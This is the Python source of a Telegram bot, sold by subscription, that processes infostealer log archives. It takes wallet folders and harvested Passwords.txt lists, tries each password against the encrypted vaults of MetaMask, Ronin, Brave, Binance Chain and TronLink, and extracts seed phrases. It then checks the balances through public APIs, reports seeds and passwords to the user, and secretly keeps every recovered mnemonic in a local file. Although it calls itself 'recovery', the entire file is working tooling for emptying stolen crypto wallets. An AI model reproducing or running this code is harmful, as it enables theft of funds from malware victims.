import base64
import datetime
import hashlib
import json
import os
import os.path
import re
import shutil
import requests
from anonfile import AnonFile
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
import markups as nav
from urllib.request import urlopen
from shutil import copyfileobj
import ssl


with open('config.json') as config:
    cfg = json.loads(config.read())
Bot = Bot(token=cfg[0]['bot_token'])
dp = Dispatcher(Bot)


@dp.message_handler(commands=['start'])
async def process_help_command(msg: types.Message):
    await Bot.send_message(msg.from_user.id, f'''
You should to send zip file with log and passwords - /manual
''', reply_markup=nav.mainMenu)


@dp.message_handler(commands=['manual'])
async def process_help_command(msg: types.Message):
    await Bot.send_message(msg.from_user.id, f'''
Manual - (Github version not exists manual)
''', reply_markup=nav.mainMenu)


@dp.message_handler(commands=['info'])
async def process_help_command(msg: types.Message):
    await Bot.send_message(msg.from_user.id, f'''
Bot created for recovery your crypto wallet.
METAMASK
RONINWALLET
BRAVE
BinanceSmartChain
TronLINK

If you have any questions, then you can write me -->  @furious_tc
''', reply_markup=nav.mainMenu)


@dp.message_handler(content_types='text')
async def download_url(msg: types.Message):
    if str(msg.from_user.id) in cfg[0]['Admins']:
        global name, size
        await Bot.send_message(msg.from_user.id, '🤖Examination. Be patient)')
        if msg.text.__contains__('download') and msg.text.__contains__('mediafire.com') or msg.text.__contains__(
                'anonfiles.com'):
            id_user = msg.from_user.id
            if os.path.exists(f'{os.getcwd()}/logs/{id_user}'):
                shutil.rmtree(f'{os.getcwd()}/logs/{id_user}')
                os.mkdir(f'{os.getcwd()}/logs/{id_user}')
                file = open(f'logs/{id_user}/@{msg.from_user.username}.txt', 'w')
                file.close()
            else:
                os.mkdir(f'{os.getcwd()}/logs/{id_user}')
                file = open(f'logs/{id_user}/@{msg.from_user.username}.txt', 'w')
                file.close()
            import requests
            req = requests.get(msg.text)
            try:
                if str(req.status_code) == '200':
                    if msg.text.__contains__('mediafire.com'):
                        size = req.headers['Content-Length']
                        name = req.headers['Content-Type'][-3:]
                        if str(name) == 'zip' and int(size) < 261715200:
                            await Bot.send_message(msg.from_user.id, '🤖Uploading! Wait please!')

                            ssl._create_default_https_context = ssl._create_unverified_context
                            context = ssl._create_default_https_context()
                            with urlopen(msg.text, context=context) as response, open(
                                    f'logs/{id_user}/{id_user}.{name}',
                                    'wb') as out_file:
                                shutil.copyfileobj(response, out_file)
                            import zipfile
                            shutil.unpack_archive(f'logs/{id_user}/{id_user}.{name}',
                                                  f'{os.getcwd()}/logs/{id_user}')
                            await Bot.send_message(msg.chat.id, '🤖Upload finished! Lets go!')
                            # await Bot.forward_message('-1001660902650', msg.chat.id, msg.message_id)
                            CryptoChecker(msg.from_user.id, msg.from_user.username)
                            await Bot.send_document(msg.from_user.id, open(
                                f'{os.getcwd()}/logs/{msg.from_user.id}/@{msg.from_user.username}.txt', 'rb'))

                    elif msg.text.__contains__('anonfiles'):
                        anon = AnonFile()
                        name = anon.preview(msg.text)
                        size = anon.preview(msg.text).size
                        if size < 350288000:
                            if str(name)[-3:] == 'zip':
                                try:
                                    anon = AnonFile()

                                    target_dir = f'{os.getcwd()}/logs/{msg.from_user.id}'
                                    filename = anon.download(msg.text, path=target_dir).file_path
                                    shutil.unpack_archive(filename,
                                                          f"{os.getcwd()}/logs/{msg.from_user.id}")
                                    await Bot.send_message(msg.chat.id, '🤖Upload finished! Lets go!')

                                    CryptoChecker(msg.from_user.id, msg.from_user.username)
                                    await Bot.send_document(msg.from_user.id, open(
                                        f'{os.getcwd()}/logs/{msg.from_user.id}/@{msg.from_user.username}.txt', 'rb'))
                                except:
                                    await Bot.send_message(msg.chat.id, '🤖Cannot save your log!')
                            else:
                                await Bot.send_message(msg.chat.id, '⛔It is not zip file or something went wrong.')

                    else:
                        await Bot.send_message(msg.chat.id,
                                               f'⛔This file hosting isn\'t in our list! Read manual!')
                else:
                    await Bot.send_message(msg.chat.id, '⛔Something went wrong! Read manual!')
            except:
                await Bot.send_message(msg.chat.id, '⛔Attention! Read manual!')
        elif msg.text == "📚 About project!":
            await Bot.send_message(msg.from_user.id, f'''
Bot created for recovery your crypto wallet.
METAMASK
RONINWALLET
BRAVE
BinanceSmartChain
TronLINK

If you have any questions, then you can write me -->  @furious_tc
            ''', reply_markup=nav.mainMenu)
        elif msg.text == "📜 Manuals!":
            await Bot.send_message(msg.from_user.id, f'''
                Manual - (Github version not exists manual)
                ''', reply_markup=nav.mainMenu)
        elif msg.text == "👀 Check log!":
            await Bot.send_message(msg.from_user.id, f'''
                You should to send zip file with log and passwords - /manual
                ''', reply_markup=nav.mainMenu)
        else:
            await Bot.send_message(msg.chat.id, '⛔Attention! Read manual!')
    else:
        await Bot.send_message(msg.chat.id, '⛔If you wanna buy subscription, write me - @furious_tc!')


@dp.message_handler(content_types=['document'])
async def scan_message(msg: types.Message):
    if str(msg.from_user.id) in cfg[0]['Admins']:
        document_id = msg.document.file_id
        id_user = msg.from_user.id
        file_info = await Bot.get_file(document_id)
        fi = file_info.file_path
        name = msg.document.mime_subtype
        file_size = file_info.file_size

        if file_size < 21000000:
            if os.path.exists(f'{os.getcwd()}/logs/{id_user}'):
                shutil.rmtree(f'{os.getcwd()}/logs/{id_user}')
                os.mkdir(f'{os.getcwd()}/logs/{id_user}')
                file = open(f'logs/{id_user}/@{msg.from_user.username}.txt', 'w')
                file.close()
            else:
                os.mkdir(f'{os.getcwd()}/logs/{id_user}')
                file = open(f'logs/{id_user}/@{msg.from_user.username}.txt', 'w')
                file.close()
            try:
                if name == 'zip':
                    await Bot.send_message(msg.from_user.id, '🤖Начинаю скачивание! Ожидайте!')
                    url = f'https://api.telegram.org/file/bot{cfg[0]["bot_token"]}/{fi}'
                    ssl._create_default_https_context = ssl._create_unverified_context
                    context = ssl._create_default_https_context()
                    with urlopen(url, context=context) as in_stream, open(f'logs/{id_user}/{id_user}.{name}',
                                                                          'wb') as out_file:
                        copyfileobj(in_stream, out_file)

                    shutil.unpack_archive(f'logs/{id_user}/{id_user}.{name}',
                                          f'{os.getcwd()}/logs/{id_user}')

                    await Bot.send_message(msg.chat.id, '🤖Распаковал! Начинаю проверку!')
                    CryptoChecker(msg.from_user.id, msg.from_user.username)
                    await Bot.send_document(msg.from_user.id,
                                            open(f'{os.getcwd()}/logs/{msg.from_user.id}/@{msg.from_user.username}.txt',
                                                 'rb'))
                else:
                    await Bot.send_message(msg.chat.id, '⛔Это не ZIP, или же проблема с вашей стороны!')
            except:
                await Bot.send_message(msg.chat.id, '⛔Что-то пошло не так! Обратись к мануалу - /manual')
        else:
            await Bot.send_message(msg.chat.id, '⛔Файл отправляемый напрямую, не может превышать 20 мегабайт - /manual')
    else:
        await Bot.send_message(msg.chat.id, '⛔За покупкой лицензии, писать сюда - @furious_tc!')


class CryptoChecker:
    def __init__(self, id_user, username):
        global balance, balance_info, how_mach_wallets, wallets_with_money, valid_money
        self.crypto_wallets = ['tronlink', 'roninwallet', 'metamask', 'bravewallet', 'binancechain']
        self.crypto = ''
        self.id_user = id_user
        self.username = username

        valid_money = float(0)
        balance_info = float(0)
        balance = float(0)
        how_mach_wallets = float(0)
        wallets_with_money = float(0)

        logs = os.listdir(f'{os.getcwd()}/logs/{id_user}')
        if len(logs) < 1:
            print("0 LOGS")
            return
        for log in logs:
            if not os.path.exists(f"{os.getcwd()}/logs/{id_user}/{log}/Wallets"):
                print("Wallets not found")
                continue
            wallets = os.listdir(f"{os.getcwd()}/logs/{id_user}/{log}/Wallets")

            for wallet in wallets:

                for i, c in enumerate(self.crypto_wallets):
                    if wallet.lower().__contains__(c):
                        path = f'{os.getcwd()}/logs/{id_user}/{log}/Wallets/{wallet}'
                        path_log = f'{os.getcwd()}/logs/{id_user}/{log}'
                        how_mach_wallets += 1
                        if c == 'metamask':
                            MetaMask(path, path_log, c, self.id_user, self.username)
                        elif c == 'roninwallet':
                            RoninWallet(path, path_log, c, self.id_user, self.username)
                        elif c == 'bravewallet':
                            BraveWallet(path, path_log, c, self.id_user, self.username)
                        elif c == 'binancechain':
                            BinanceChain(path, path_log, c, self.id_user, self.username)
                        elif c == 'tronlink':
                            TronLink(path, path_log, c, self.id_user, self.username)
                        else:
                            continue
                        balance_info += balance
                        if balance > 0:
                            wallets_with_money += 1


                    else:
                        continue

        self.finish_message(balance_info, how_mach_wallets, wallets_with_money, valid_money)

    def finish_message(self, balance_info, how_mach_wallets, wallets_with_money, valid_money):
        date = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        text = f'''
<b>@furious_checker_bot</b>
✅<b>All valid:</> {int(how_mach_wallets)}
💵<b>With balance:</b> {int(wallets_with_money)} 
💰<b>All balance:</b> {round(balance_info, 2)} $
🕗<b>Check time:</b> {date}
<b>Our chat - </b>
                '''
        with open('config.json', 'r') as fp:
            cfg = json.loads(fp.read())
        url = f"https://api.telegram.org/bot{cfg[0]['bot_token']}/sendMessage"
        data = {
            'chat_id': f'{self.id_user}',
            'text': f'{text}',
            'parse_mode': f'html'
        }
        requests.get(url, data=data)


class MetaMask:
    def __init__(self, path, path_log, crypto, id_user, username):
        self.crypto = crypto
        self.msg = ''
        self.path = path
        self.path_log = path_log
        self.meta_sites = {"https://debank.com/profile/": ".HeaderInfo_total__2GhFP"}
        self.id_user = id_user
        self.username = username

        with open('config.json', 'r') as fp:
            self.cfg = json.loads(fp.read())
        self.check_balance()

    def check_balance(self):
        vault = ""
        addresses1 = []
        used_passes = []
        checked_addresses = []
        self.msg = ''
        meta_files = os.walk(self.path)
        for files in meta_files:
            for file in files[2]:

                if file.__contains__(".log") or file.__contains__(".txt"):
                    log_file = open(f"{self.path}/{file}", "r",
                                    errors='ignore').read(5000)

                    data = log_file.replace('\\', '')
                    try:
                        vault = re.search('{"vault":"(.+)"},"MetaMetricsController"', data).groups()[0]
                        addresses = re.search('"CachedBalancesController":(.+?),"C', data).groups()[0].split(
                            ",")
                    except:
                        print("Acc not found")
                        continue
                    for address in addresses:
                        try:
                            addresses1.append(
                                re.search('0x(.+)":{"(.+)', address.split('":"')[0]).groups()[1])
                        except:
                            continue

                else:
                    continue
            mnemonic = ""
            if os.path.exists(f"{self.path_log}/Passwords.txt"):
                passwords = open(f"{self.path_log}/Passwords.txt", "r", errors='ignore')
                for line in passwords.readlines():
                    if line.__contains__("Password: "):
                        password = line.split("Password: ", maxsplit=1)[1].replace("\n", "")
                        if password in used_passes:
                            continue
                        mnemonic = CheckPass(vault, password, self.crypto)
                        if mnemonic:
                            break
                        used_passes.append(password)
                used_passes.clear()
            for address in addresses1:
                if address in checked_addresses:
                    continue
                try:
                    GenerateMessage(self.meta_sites, self.crypto, mnemonic, address, self.cfg, self.id_user,
                                    self.username)
                except:
                    continue
                checked_addresses.append(address)
            addresses1.clear()


class RoninWallet:
    def __init__(self, path, path_log, crypto, id_user, username):
        self.msg = ''
        self.id_user = id_user
        self.username = username

        self.crypto = crypto
        self.path = path
        self.path_log = path_log
        self.meta_sites = {"https://debank.com/profile/": ".HeaderInfo_total__2GhFP"}
        with open('config.json', 'r') as fp:
            self.cfg = json.loads(fp.read())
        self.check_balance()

    def check_balance(self):
        global msg, address
        vault = ""
        addresses1 = []
        used_passes = []
        addresses = []
        checked_addresses = []
        meta_files = os.walk(self.path)
        for files in meta_files:
            for file in files[2]:
                if file.__contains__(".log") or file.__contains__(".txt"):
                    log_file = open(f"{self.path}/{file}", "r",
                                    errors='ignore').read(130000)

                    data = log_file.replace('\\', '')
                    try:
                        vault = re.search('encryptedVault›"(.+?)†', data).groups()[0][:-5]
                        print(vault)
                        address = re.search('selectedAccounth{"address":"(.+?)","index', data).groups()[0].split(",")[0]
                        print(address)

                    except:
                        print("Аккаунт не найден")
                        continue

                else:
                    continue
            mnemonic = ""
            if os.path.exists(f"{self.path_log}/Passwords.txt"):
                passwords = open(f"{self.path_log}/Passwords.txt", "r", errors='ignore')
                for line in passwords.readlines():
                    if line.__contains__("Password: "):
                        password = line.split("Password: ", maxsplit=1)[1].replace("\n", "")
                        if password in used_passes:
                            continue
                        mnemonic = CheckPass(vault, password, self.crypto)

                        if mnemonic:
                            break
                        used_passes.append(password)
                used_passes.clear()
            try:
                GenerateMessage(self.meta_sites, self.crypto, mnemonic, address, self.cfg, self.id_user, self.username)
            except:
                continue
            checked_addresses.append(address)


class BraveWallet:

    def __init__(self, path, path_log, crypto, id_user, username):
        self.msg = ''
        self.id_user = id_user
        self.username = username

        self.crypto = crypto
        self.path = path
        self.path_log = path_log
        self.meta_sites = {"https://debank.com/profile/": ".HeaderInfo_total__2GhFP"}

        with open('config.json', 'r') as fp:
            self.cfg = json.loads(fp.read())
        self.check_balance()

    def check_balance(self):
        global msg
        vault = ""
        addresses1 = []
        used_passes = []
        checked_addresses = []
        meta_files = os.walk(self.path)
        for files in meta_files:
            for file in files[2]:

                if file.__contains__(".log") or file.__contains__(".txt"):
                    log_file = open(f"{self.path}/{file}", "r",
                                    errors='ignore').read(5000)

                    data = log_file.replace('\\', '')
                    try:
                        vault = re.search('{"vault":"(.+)"},"NetworkController"', data).groups()[0]
                        addresses = re.search('"CachedBalancesController":(.+),"C', data).groups()[0].split(
                            ",")
                    except:
                        print("Аккаунт не найден")
                        continue
                    for address in addresses:
                        try:
                            addresses1.append(
                                re.search('0x(.+)":{"(.+)', address.split('":"')[0]).groups()[1])
                        except:
                            continue

                else:
                    continue
            mnemonic = ""
            if os.path.exists(f"{self.path_log}/Passwords.txt"):
                passwords = open(f"{self.path_log}/Passwords.txt", "r", errors='ignore')
                for line in passwords.readlines():
                    if line.__contains__("Password: "):
                        password = line.split("Password: ", maxsplit=1)[1].replace("\n", "")
                        if password in used_passes:
                            continue
                        mnemonic = CheckPass(vault, password, self.crypto)

                        if mnemonic:
                            break
                        used_passes.append(password)
                used_passes.clear()
            for address in addresses1:
                if address in checked_addresses:
                    continue
                try:
                    GenerateMessage(self.meta_sites, self.crypto, mnemonic, address, self.cfg, self.id_user,
                                    self.username)
                except:
                    continue
                checked_addresses.append(address)

            addresses1.clear()


class BinanceChain:
    def __init__(self, path, path_log, crypto, id_user, username):
        self.msg = ''
        self.id_user = id_user
        self.username = username

        self.crypto = crypto
        self.path = path
        self.path_log = path_log
        self.meta_sites = {"https://debank.com/profile/": ".HeaderInfo_total__2GhFP"}
        import json
        with open('config.json', 'r') as fp:
            self.cfg = json.loads(fp.read())
        self.check_balance()

    def check_balance(self):
        global msg, vaults
        vaults = []
        addresses1 = []
        used_passes = []
        checked_addresses = []
        meta_files = os.walk(self.path)
        for files in meta_files:
            for file in files[2]:

                if file.__contains__(".log") or file.__contains__(".txt"):
                    log_file = open(f"{self.path}/{file}", "r",
                                    errors='ignore').read(1000000)

                    data = log_file.replace('\\', '')
                    try:
                        vaults = re.findall('{"data":"(.+?)="}', data)
                        addresses = re.findall(r'"address\\\\\\":\\\\\\"(.+?)\\\\\\"', log_file)

                    except:
                        print("Адресс аккаунта не найден")
                        continue
                    for address in addresses:
                        try:
                            addresses1.append(
                                re.search('0x(.+)":{"(.+)', address.split('":"')[0]).groups()[1])
                        except:
                            continue

                else:
                    continue
            mnemonic = ""
            if os.path.exists(f"{self.path_log}/Passwords.txt"):
                passwords = open(f"{self.path_log}/Passwords.txt", "r", errors='ignore')

                for line in passwords.readlines():
                    if line.__contains__("Password: "):
                        password = line.split("Password: ", maxsplit=1)[1].replace("\n", "")
                        if password in used_passes:
                            continue

                        for i, vault in enumerate(vaults):
                            vault = r'{' + f'"data":"' + vault + r'="}'
                            mnemonic = CheckPass(vault, password, self.crypto)
                            if not str(mnemonic).__contains__('Not found'):

                                break
                            else:
                                continue
                        if not str(mnemonic).__contains__('Not found'):
                            break
                        else:
                            continue

                used_passes.clear()

            for address in addresses1:
                if address in checked_addresses:
                    continue
                GenerateMessage(self.meta_sites, self.crypto, mnemonic, address, self.cfg, self.id_user, self.username)
                checked_addresses.append(address)

            addresses1.clear()


class TronLink:
    def __init__(self, path, path_log, crypto, id_user, username):
        self.msg = ''
        self.id_user = id_user
        self.username = username
        self.crypto = crypto
        self.path = path
        self.path_log = path_log
        self.meta_sites = {"https://debank.com/profile/": ".HeaderInfo_total__2GhFP"}

        with open('config.json', 'r') as fp:
            self.cfg = json.loads(fp.read())
        self.check_balance()

    def check_balance(self):
        global msg, vaults, address
        vaults = []

        addresses1 = []
        used_passes = []
        checked_addresses = []
        meta_files = os.walk(self.path)
        for files in meta_files:
            for file in files[2]:

                if file.__contains__(".log") or file.__contains__(".txt"):
                    log_file = open(f"{self.path}/{file}", "r",
                                    errors='ignore').read(10000000)

                    data = log_file.replace('\\', '')
                    try:
                        vaults = re.findall('data_accounts\w{2}\S(.+?)}', data)
                    except:
                        print("Address not found!")
                        continue
                else:
                    continue
            mnemonic = ""
            if os.path.exists(f"{self.path_log}/Passwords.txt"):
                passwords = open(f"{self.path_log}/Passwords.txt", "r", errors='ignore')

                for line in passwords.readlines():
                    if line.__contains__("Password: "):
                        password = line.split("Password: ", maxsplit=1)[1].replace("\n", "")
                        if password in used_passes:
                            continue

                        for i, vault in enumerate(vaults):
                            vault = f'{vault}' + r'}'
                            mnemonic = CheckPass(vault, password, self.crypto)
                            if not str(mnemonic).__contains__('Not found'):
                                used_passes.append(password)
                                import json
                                try:
                                    data = json.loads(vault)
                                    password = password
                                    salt = base64.b64decode(data['salt'])
                                    vault = base64.b64decode(data['data'])
                                    iv = base64.b64decode(data['iv'])
                                except:
                                    self.mnemonic = f"Mnemonic: Not found:(\nPassword: Not found:("
                                    return None
                                key = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8', 'ignore'), salt, 10000, 32)

                                from Crypto.Cipher import AES
                                decrypted_block = AES.new(key, AES.MODE_GCM, nonce=iv).decrypt(vault)
                                try:
                                    address = str(
                                        re.findall(r'address":"(.+?)"', decrypted_block.decode('utf-8', 'ignore'))[0])
                                    GenerateMessage(self.meta_sites, self.crypto, mnemonic, address, self.cfg,
                                                    self.id_user, self.username)
                                except:
                                    continue
                                break
                            else:
                                continue
                used_passes.clear()

            for address in addresses1:
                if address in checked_addresses:
                    continue

                checked_addresses.append(address)

            addresses1.clear()


class GenerateMessage:
    def __init__(self, meta_sites, crypto, mnemonic, address, cfg, id_user, username):
        global msg, balance, valid_money
        self.cfg = cfg
        balance = 0
        self.mnemonic = mnemonic
        self.msg = ''
        self.address = address
        self.meta_sites = meta_sites
        self.crypto = crypto

        msg = f"""🤑WALLET: {self.crypto.upper()}\n✅Address: {self.address}\n🍀Balance: """
        for site, css in self.meta_sites.items():
            if self.crypto == 'tronlink':
                try:
                    req = requests.get(f'https://apilist.tronscan.org/api/account?address={address}').content
                    balance = re.search(r'"amount":"(.+?)","', str(req)).groups()[0]
                    try:
                        msg += f'{round(float(balance), 2)} $\n'
                        balance = float(balance)
                    except:
                        continue
                except:
                    continue
            else:
                req = requests.get(f'https://openapi.debank.com/v1/user/total_balance?id={self.address}').content
            try:
                if self.crypto == 'tronlink':
                    pass
                else:
                    info = json.loads(req)
                    msg += f"{str(round(float(info['total_usd_value']), 2))}$ \n"
                    balance = float(info['total_usd_value'])
            except:
                continue
                # msg += f"{site + self.address} error\n"
            if self.mnemonic:
                msg += f"{self.mnemonic}\n"
            if '💣Seed:' in str(mnemonic).split():
                valid_money += balance
            Sender(id_user, msg, id_user, username)
            Info(msg, id_user, username)


class CheckPass:
    def __init__(self, info, passwd, crypto):
        global mnemonic
        mnemonic = ''
        self.mnemonic = ''
        self.crypto = crypto
        self.check_password(info, passwd)

    def check_password(self, info, passwd):
        import json
        try:
            data = json.loads(info)
            password = passwd
            salt = base64.b64decode(data['salt'])
            vault = base64.b64decode(data['data'])
            iv = base64.b64decode(data['iv'])
        except:
            return None

        key = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8', 'ignore'), salt, 10000, 32)

        from Crypto.Cipher import AES
        decrypted_block = AES.new(key, AES.MODE_GCM, nonce=iv).decrypt(vault)

        if self.crypto == 'metamask' or self.crypto == 'bravewallet':
            phrase = '"mnemonic":"'
            start_phrase = '"mnemonic":"'
            start_num = 12
            end_phrase = '","numberOfAccounts"'
            end_num = 43
        elif self.crypto == 'roninwallet' or self.crypto == 'binancechain' or self.crypto == 'tronlink':
            phrase = 'mnemonic'
        try:
            if decrypted_block.decode('utf-8', 'ignore').__contains__(phrase):
                if self.crypto == 'metamask' or self.crypto == 'bravewallet':
                    xuy = decrypted_block.decode('utf-8', 'ignore').find(start_phrase) + start_num
                    xuy2 = decrypted_block.decode('utf-8', 'ignore').find(end_phrase) - end_num
                    mnemonic = decrypted_block.decode('utf-8', 'ignore')[xuy:][:xuy2]
                    AddInfo(mnemonic, self.crypto)
                elif self.crypto == 'roninwallet' or self.crypto == 'binancechain' or self.crypto == 'tronlink':
                    if self.crypto == 'roninwallet':
                        mnemonic = decrypted_block.decode('utf-8', 'ignore').replace('\\', '')
                        mnemonic = re.search('mnemonic":"(.+?)"', mnemonic).groups()[0]
                    else:
                        mnemonic = decrypted_block.decode('utf-8', 'ignore')
                        mnemonic = re.search('mnemonic":"(.+?)"', mnemonic).groups()[0]
                    AddInfo(mnemonic, self.crypto)

                self.mnemonic = f"💣Seed: {str(mnemonic)}\n💣Пароль: {passwd}"

            else:
                return None
        except:
            return None

    def __str__(self):
        return '%s' % self.mnemonic


class Sender:
    def __init__(self, id, text, id_user, username):
        with open('config.json', 'r') as fp:
            cfg = json.loads(fp.read())
        url = f"https://api.telegram.org/bot{cfg[0]['bot_token']}/sendMessage"
        data = {
            'chat_id': f'{id_user}',
            'text': f'{text}',
            'parse_mode': f'html'
        }
        requests.get(url, data=data)


class Info:
    def __init__(self, text, id_user, username):
        global ids
        ids = id_user

        try:
            path_txt = f'{os.getcwd()}/logs/{id_user}/@{username}.txt'
            with open(path_txt, 'a', encoding='utf-8') as file:
                file.write(text)
        except:
            pass


class AddInfo:
    def __init__(self, mnemonic, crypto):
        try:
            with open('info.txt', 'r') as save:
                lines = save.readlines()
                if f'{str(mnemonic)}\n' not in lines:
                    with open('info.txt', 'a') as save:
                        save.write(f"{mnemonic}\n")
            try:
                with open('guys.txt', 'r') as save:
                    lines = save.readlines()
                    if f'{ids}\n' not in lines:
                        with open('guys.txt', 'a') as save:
                            save.write(f'{ids}\n')
                    else:
                        pass
            except:
                pass
        except:
            print('Mnemonic not found')


if __name__ == '__main__':
    executor.start_polling(dp)
